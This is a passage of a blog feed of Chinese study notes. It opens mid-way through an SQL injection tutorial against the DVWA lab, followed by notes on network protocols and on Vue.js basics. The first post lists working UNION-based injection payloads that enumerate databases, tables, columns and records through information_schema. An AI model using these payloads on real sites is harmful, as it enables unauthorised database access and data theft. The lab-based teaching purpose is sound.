class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1 and 1=1&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1 and 1=2&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>此时前两条语句执行结果不同，后两条结果不同</p><p>原因：MySQL的隐式转换</p></blockquote><h3 id="判断表中的列数"><a href="#判断表中的列数" class="headerlink" title="判断表中的列数"></a>判断表中的列数</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><blockquote><p>为了方便后续获取数据，需要先知道查询的表中显示的字段数，可以使用order by来进行判断。ORDER BY*语句用于根据指定的列对结果集进行排序。 </p><p>用法：order by 列名或者order by 列编号。</p><p>特性：当order by的数字大于当前的列数时候就会报错，SQL注入利用这个特性来判断列数</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>从1一直往下试  最终判断出表的列数</p><h3 id="确定显示位"><a href="#确定显示位" class="headerlink" title="确定显示位"></a>确定显示位</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><blockquote><p>显示位：在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面 中，这个展示数据的位置就叫显示位。 </p><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名，并且UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥 有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p></blockquote><p>例句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 -- a </span></span><br></pre></td></tr></table></figure><blockquote><p>其中 -1（不常用的id）若改为1（常用的id），那么union前面子句的查询结果可能会覆盖在显示位上，导致后面的子句结果不可见。</p></blockquote><p>此时观察1、2、3中哪个数字在页面中显示，该数字所占位置就是显错位。</p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><h4 id="1-获取数据库名和版本"><a href="#1-获取数据库名和版本" class="headerlink" title="1. 获取数据库名和版本"></a>1. 获取数据库名和版本</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select version(),database()</span></span><br></pre></td></tr></table></figure><h4 id="2-获取数据库表名"><a href="#2-获取数据库表名" class="headerlink" title="2. 获取数据库表名"></a>2. 获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,table_name from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;</span>dvwa<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>很多网站只显示1条结果，为了能够输出所有结果，可以使用group_concat()函数，将多行合并成一行：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where</span></span><br><span class="line"><span class="string">table_schema=&#x27;</span>dvwa<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><blockquote><p>有时候单纯输入以上语句会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illegal mix of collations for operation &#x27;UNION&#x27;</span><br></pre></td></tr></table></figure><p>解决方案：将select子句格式可能有问题的部分用hex()处理一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,hex(group_concat(table_name)) from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>参考此文章：<a href="https://blog.csdn.net/m0_47470899/article/details/118695774">https://blog.csdn.net/m0_47470899/article/details/118695774</a></p></blockquote><h4 id="3-获取某个表中的字段名"><a href="#3-获取某个表中的字段名" class="headerlink" title="3. 获取某个表中的字段名"></a>3. 获取某个表中的字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns</span></span><br><span class="line"><span class="string">where table_name=&#x27;</span>guestbook<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="4-获取字段中的记录"><a href="#4-获取字段中的记录" class="headerlink" title="4. 获取字段中的记录"></a>4. 获取字段中的记录</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(comment_id,comment,name) from guestbook</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1.%E5%90%84%E5%B1%82%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/1.%E5%90%84%E5%B1%82%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="各层常用协议"><a href="#各层常用协议" class="headerlink" title="各层常用协议"></a>各层常用协议</h1><h2 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h2><blockquote><p>http  https  SSH  DNS  Telnet   FTP      DHCP    SMTP   POP3   RDP     SMB    MySql<br>80    443     22     53       23    20/21      67/68      25        110      3389      445      3306</p></blockquote><h2 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a>传输层协议</h2><blockquote><pre><code> ​    TCP                                 UDP 传输控制协议             用户数据报协议</code></pre></blockquote><h2 id="网络层协议"><a href="#网络层协议" class="headerlink" title="网络层协议"></a>网络层协议</h2><blockquote><p>ICMP<br>Internet Control Message Protocol<br>internet控制报文协议 用于在ip主机、路由器之间传递控制消息（网络是否通，主机是否可达）。</p></blockquote><blockquote><p>IP<br>Internet Protocol<br>网际互连协议：实现大规模、异构网络的互联互通。</p></blockquote><blockquote><p>ARP<br>Address Resolution Protocol<br>地址解析协议：根据IP地址获取物理地址的协议</p></blockquote><h2 id="数据链路层协议"><a href="#数据链路层协议" class="headerlink" title="数据链路层协议"></a>数据链路层协议</h2><blockquote><p>PPP<br>Point-to-Point Protocal—–ppp点到点：数据链路层封装协议中的一种，常用于广域网，使用串行链路提供远距离数据传输服务。</p></blockquote><blockquote><p>Ethernet<br>以太网：实现链路层的数据传输和地址封装（MAC，常用于局域网。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue初学</title>
      <link href="/2023/06/07/%E5%B0%8F%E5%AF%84%E5%B7%A7/vue%E5%88%9D%E5%AD%A6/"/>
      <url>/2023/06/07/%E5%B0%8F%E5%AF%84%E5%B7%A7/vue%E5%88%9D%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h1><h2 id="什么是vue"><a href="#什么是vue" class="headerlink" title="什么是vue"></a>什么是vue</h2><p>vue是js框架，也就是一堆写好的代码</p><h2 id="简单的使用例子"><a href="#简单的使用例子" class="headerlink" title="简单的使用例子"></a>简单的使用例子</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">title</span>: <span class="string">&#x27;零食清单&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在以上的代码中 有三个关键部分</p><ul><li><p>6：script标签导入vue</p><blockquote><p>若不想经过构建流程就可以使用vue，可以这么做（CDN方式构建）（CDN的地址以后可能有变动）</p></blockquote></li><li><p>13：createApp()函数创建新实例</p><blockquote><ul><li><p>createApp()函数有可选参数，类型是对象{}</p></li><li><p>createApp()传入了一个对象：</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line"><span class="attr">title</span>: <span class="string">&#x27;零食清单&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这个对象有一个data()方法，返回值中有title，title值为“零食清单”</p></li><li><p>函数后面跟了.mount(“#app”)，也就是调用了mount方法挂载在了dom中的id为“app”的标签上，也就是：</p><p>  Vue.createApp({}).mount(“#app”)</p></li></ul></blockquote></li><li><p>10： 插值表达式</p><blockquote>Vue初学，一个类似于这样的结构，data()返回值title插入到此处，并在页面中显示。</blockquote></li></ul><p>这就是vue一个简单的使用方法</p><hr><h2 id="v-for循环打印列表"><a href="#v-for循环打印列表" class="headerlink" title="v-for循环打印列表"></a>v-for循环打印列表</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in food&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;item.img&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;img&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model:</span>&quot;<span class="attr">item.purchased</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.purchased &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">title</span>: <span class="string">&#x27;零食清单&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">food</span>: [</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;原味鱿鱼丝&#x27;</span>, <span class="attr">img</span>: <span class="string">&#x27;./images/1.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;辣味鱿鱼丝&#x27;</span>, <span class="attr">img</span>: <span class="string">&#x27;./images/2.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;碳味鱿鱼丝&#x27;</span>, <span class="attr">img</span>: <span class="string">&#x27;./images/3.png&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">]</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>v-for使用方法</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in list&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- 这里的list是一个数组 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>return中的值可以为数组</p><p>  如：</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span>&#123;</span><br><span class="line"><span class="attr">title</span>:<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line"><span class="attr">list</span>: [</span><br><span class="line">&#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: first&#125;,</span><br><span class="line">&#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: second&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>v-bind单向数据绑定</p><blockquote><p>绑定后，vue的数据改变会影响dom，而dom对数据作修改不会影响vue中的数据</p></blockquote><blockquote><p>注意：当元素的属性值是动态的时候应该用到v-bind属性。</p><p>如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in items&quot;</span> <span class="attr">v-bind:id</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span>&#123;&#123; item.id &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>v-model双向数据绑定</p><blockquote><p>绑定后，dom和vue中的数据相互影响。</p></blockquote></li></ul><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">food =&gt; food.<span class="property">value</span></span><br></pre></td></tr></table></figure><blockquote><p>这里 将food作为参数传入函数里，函数体为food.value</p><p>就这么简单</p></blockquote><h2 id="key、v-show、computed"><a href="#key、v-show、computed" class="headerlink" title="key、v-show、computed()"></a>key、v-show、computed()</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@3&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">v-show</span>=<span class="string">&quot;food.filter(item =&gt; !item.purchased).length&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>未购买<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in food.filter(item =&gt; item.purchased == false)&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;item.purchased&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.purchased &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">v-show</span>=<span class="string">&quot;food.filter(item =&gt; item.purchased).length&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>已购买<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in food.filter(item =&gt; item.purchased)&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;item.purchased&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.purchased &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">title</span>: <span class="string">&#x27;零食清单&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">food</span>: [</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;原味鱿鱼丝&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;辣味鱿鱼丝&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;碳味鱿鱼丝&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">]</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-for-中的key"><a href="#v-for-中的key" class="headerlink" title="v-for 中的key"></a>v-for 中的key</h3><blockquote><p>v-for 中以key作为数组中元素的唯一标识。这个key默认为index</p><p>v-for=“(item,index) in items”  这里的index就是默认的key</p><p>如果和当前示例代码一样，一个数组要被两个v-for使用过滤器过滤后当作参数时，就可能使vue犯迷糊。</p><p>这时就应该让key绑定这个数组的唯一标识。</p><p>如这里让key=id</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in foods.filter(item =&gt; item.purchased)&quot;</span> <span class="attr">bind:key</span>=<span class="string">&quot;item.id&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：这里的 bind:key= 可以缩写为 :key=(vue的常用简化写法) </p></blockquote><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h3><p>vue中控制dom中某个元素显示与不显示的属性</p><p>底层：利用css中的display进行控制控制</p><blockquote><p>本例中section标签就使用了v-show属性。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">v-show</span>=<span class="string">&quot;food.filter(item =&gt; item.purchased).length&quot;</span>&gt;</span><span class="tag">&lt;/<span 